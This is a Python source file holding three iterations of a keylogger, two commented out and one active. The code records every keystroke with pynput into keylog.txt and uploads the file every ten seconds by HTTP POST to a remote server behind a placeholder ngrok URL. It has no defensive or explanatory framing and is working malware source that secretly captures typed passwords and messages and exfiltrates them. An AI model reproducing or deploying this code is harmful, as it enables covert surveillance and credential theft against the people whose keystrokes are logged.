# # from pynput.keyboard import Key, Listener
# # import time
# # import main_3
# # import requests
# # import os
# # time.sleep(2)

# # # Function to upload the file to the Flask server
# # def upload_file_to_server(file_path):
# #     url = "your_new_url/upload"  # Replace with your ngrok URL
# #     with open(file_path, "rb") as f:
# #         files = {"file": f}
# #         response = requests.post(url, files=files)
# #         print(response.text)

# # keys = []
# # def on_press(key):
# #     keys.append(key)
# #     write_file(key)
# # def write_file(key):  
# #     with open('keylog.txt', 'a') as f:  
# #         key = str(key).replace("'", ""+ '\n')  
# #         f.write(key)
# #         f.write(' ')
# # def on_release(key):
# #     upload_file_to_server('keylog.txt')
# #     if key == Key.esc:  
# #         return False
# # time.sleep(5)
# # with Listener(on_press=on_press,
# #               on_release=on_release) as listener:  
# #     listener.join()



# from pynput.keyboard import Key, Listener
# import time
# import requests
# import os
# import threading
# import main_3

# # Function to upload the file to the Flask server
# def upload_file_to_server(file_path):
#     url = "your_new_url/upload"  # Replace with your ngrok URL
#     try:
#         with open(file_path, "rb") as f:
#             files = {"file": f}
#             response = requests.post(url, files=files)
#             print(response.text)
#     except Exception as e:
#         print(f"Error uploading file: {e}")

# # Function to handle key press events
# def on_press(key):
#     keys.append(key)
#     write_file(key)

# # Function to write the key to the file
# def write_file(key):
#     with open('keylog.txt', 'a') as f:
#         key = str(key).replace("'", "")
#         f.write(key + '\n')

# # Function to handle key release events
# def on_release(key):
#     if key == Key.esc:
#         return False
#     # Start a new thread to upload the file
#     threading.Thread(target=upload_file_to_server, args=('keylog.txt',)).start()

# # Function to monitor the keylog.txt file in real-time
# def monitor_file(file_path):
#     with open(file_path, 'r') as f:
#         f.seek(0, os.SEEK_END)  # Go to the end of the file
#         while True:
#             line = f.readline()
#             if line:
#                 print(line.strip())  # Print the new line
#             else:
#                 time.sleep(0.1)  # Wait briefly before trying again

# # Start the file monitoring in a separate thread
# keys = []
# file_path = 'keylog.txt'
# threading.Thread(target=monitor_file, args=(file_path,)).start()

# # Start the keylogger
# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()


from pynput.keyboard import Key, Listener
import time
import requests
import os
import threading

keys = []

# Function to upload the file to the Flask server
def upload_file_to_server(file_path):
    url = "your_new_url/upload"  # Replace with your ngrok URL
    try:
        with open(file_path, "rb") as f:
            files = {"file": f}
            response = requests.post(url, files=files)
            print(response.text)
    except Exception as e:
        print(f"Error uploading file: {e}")

# Function to handle key press events
def on_press(key):
    keys.append(key)
    write_file(key)

# Function to write keys to the file
def write_file(key):
    with open('keylog.txt', 'a') as f:
        key = str(key).replace("'", "") + '\n'
        f.write(key)
        f.write(' ')

# Function to handle key release events
def on_release(key):
    if key == Key.esc:
        return False

# Function to continuously upload the file
def upload_loop():
    while True:
        time.sleep(10)  # Upload every 10 seconds
        upload_file_to_server('keylog.txt')

# Start the upload loop in a separate thread
upload_thread = threading.Thread(target=upload_loop)
upload_thread.start()

# Start listening to keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()